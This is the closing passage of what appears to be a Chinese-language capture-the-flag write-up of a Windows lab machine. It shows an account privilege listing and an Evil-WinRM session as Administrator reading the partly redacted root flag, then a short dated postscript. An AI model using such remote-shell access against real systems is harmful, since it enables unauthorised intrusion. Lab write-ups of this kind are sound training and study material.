</span><span id="__span-25-61"><a id="__codelineno-25-61" name="__codelineno-25-61" href="#__codelineno-25-61"></a>SeDebugPrivilege<span class="w">                          </span>Debug<span class="w"> </span>programs<span class="w">                                                     </span>Enabled
</span><span id="__span-25-62"><a id="__codelineno-25-62" name="__codelineno-25-62" href="#__codelineno-25-62"></a>SeSystemEnvironmentPrivilege<span class="w">              </span>Modify<span class="w"> </span>firmware<span class="w"> </span>environment<span class="w"> </span>values<span class="w">                                 </span>Enabled
</span><span id="__span-25-63"><a id="__codelineno-25-63" name="__codelineno-25-63" href="#__codelineno-25-63"></a>SeChangeNotifyPrivilege<span class="w">                   </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">                                           </span>Enabled
</span><span id="__span-25-64"><a id="__codelineno-25-64" name="__codelineno-25-64" href="#__codelineno-25-64"></a>SeRemoteShutdownPrivilege<span class="w">                 </span>Force<span class="w"> </span>shutdown<span class="w"> </span>from<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>system<span class="w">                                </span>Enabled
</span><span id="__span-25-65"><a id="__codelineno-25-65" name="__codelineno-25-65" href="#__codelineno-25-65"></a>SeUndockPrivilege<span class="w">                         </span>Remove<span class="w"> </span>computer<span class="w"> </span>from<span class="w"> </span>docking<span class="w"> </span>station<span class="w">                               </span>Enabled
</span><span id="__span-25-66"><a id="__codelineno-25-66" name="__codelineno-25-66" href="#__codelineno-25-66"></a>SeEnableDelegationPrivilege<span class="w">               </span>Enable<span class="w"> </span>computer<span class="w"> </span>and<span class="w"> </span>user<span class="w"> </span>accounts<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>trusted<span class="w"> </span><span class="k">for</span><span class="w"> </span>delegation<span class="w">     </span>Enabled
</span><span id="__span-25-67"><a id="__codelineno-25-67" name="__codelineno-25-67" href="#__codelineno-25-67"></a>SeManageVolumePrivilege<span class="w">                   </span>Perform<span class="w"> </span>volume<span class="w"> </span>maintenance<span class="w"> </span>tasks<span class="w">                                   </span>Enabled
</span><span id="__span-25-68"><a id="__codelineno-25-68" name="__codelineno-25-68" href="#__codelineno-25-68"></a>SeImpersonatePrivilege<span class="w">                    </span>Impersonate<span class="w"> </span>a<span class="w"> </span>client<span class="w"> </span>after<span class="w"> </span>authentication<span class="w">                          </span>Enabled
</span><span id="__span-25-69"><a id="__codelineno-25-69" name="__codelineno-25-69" href="#__codelineno-25-69"></a>SeCreateGlobalPrivilege<span class="w">                   </span>Create<span class="w"> </span>global<span class="w"> </span>objects<span class="w">                                              </span>Enabled
</span><span id="__span-25-70"><a id="__codelineno-25-70" name="__codelineno-25-70" href="#__codelineno-25-70"></a>SeIncreaseWorkingSetPrivilege<span class="w">             </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">                                     </span>Enabled
</span><span id="__span-25-71"><a id="__codelineno-25-71" name="__codelineno-25-71" href="#__codelineno-25-71"></a>SeTimeZonePrivilege<span class="w">                       </span>Change<span class="w"> </span>the<span class="w"> </span><span class="nb">time</span><span class="w"> </span>zone<span class="w">                                               </span>Enabled
</span><span id="__span-25-72"><a id="__codelineno-25-72" name="__codelineno-25-72" href="#__codelineno-25-72"></a>SeCreateSymbolicLinkPrivilege<span class="w">             </span>Create<span class="w"> </span>symbolic<span class="w"> </span>links<span class="w">                                              </span>Enabled
</span><span id="__span-25-73"><a id="__codelineno-25-73" name="__codelineno-25-73" href="#__codelineno-25-73"></a>SeDelegateSessionUserImpersonatePrivilege<span class="w"> </span>Obtain<span class="w"> </span>an<span class="w"> </span>impersonation<span class="w"> </span>token<span class="w"> </span><span class="k">for</span><span class="w"> </span>another<span class="w"> </span>user<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>session<span class="w"> </span>Enabled
</span><span id="__span-25-74"><a id="__codelineno-25-74" name="__codelineno-25-74" href="#__codelineno-25-74"></a>
</span><span id="__span-25-75"><a id="__codelineno-25-75" name="__codelineno-25-75" href="#__codelineno-25-75"></a>
</span><span id="__span-25-76"><a id="__codelineno-25-76" name="__codelineno-25-76" href="#__codelineno-25-76"></a>USER<span class="w"> </span>CLAIMS<span class="w"> </span>INFORMATION
</span><span id="__span-25-77"><a id="__codelineno-25-77" name="__codelineno-25-77" href="#__codelineno-25-77"></a>-----------------------
</span><span id="__span-25-78"><a id="__codelineno-25-78" name="__codelineno-25-78" href="#__codelineno-25-78"></a>
</span><span id="__span-25-79"><a id="__codelineno-25-79" name="__codelineno-25-79" href="#__codelineno-25-79"></a>User<span class="w"> </span>claims<span class="w"> </span>unknown.
</span><span id="__span-25-80"><a id="__codelineno-25-80" name="__codelineno-25-80" href="#__codelineno-25-80"></a>
</span><span id="__span-25-81"><a id="__codelineno-25-81" name="__codelineno-25-81" href="#__codelineno-25-81"></a>Kerberos<span class="w"> </span>support<span class="w"> </span><span class="k">for</span><span class="w"> </span>Dynamic<span class="w"> </span>Access<span class="w"> </span>Control<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>device<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>disabled.
</span></code></pre></div></p>
<h2 id="flag-root">flag: root<a class="headerlink" href="#flag-root" title="Permanent link">&para;</a></h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">ls</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="n">-ar</span><span class="p">---</span>        <span class="n">7</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2023</span>   <span class="n">3</span><span class="p">:</span><span class="n">53</span> <span class="n">AM</span>             <span class="n">34</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="n">c714</span><span class="err">（</span><span class="n">略</span><span class="err">）</span><span class="n">58d9</span>
</span></code></pre></div>
<hr />
<h2 id="_5">总结·后记<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<p>2023/07/22</p>
<p>……</p>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.path", "navigation.expand", "search.suggest", "search.highlight", "search.share", "content.code.copy", "header.autohide", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
        <script src="../../../static/js/extra.js"></script>
      
    
  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(() => { lightbox.reload() });
</script></body>
</html>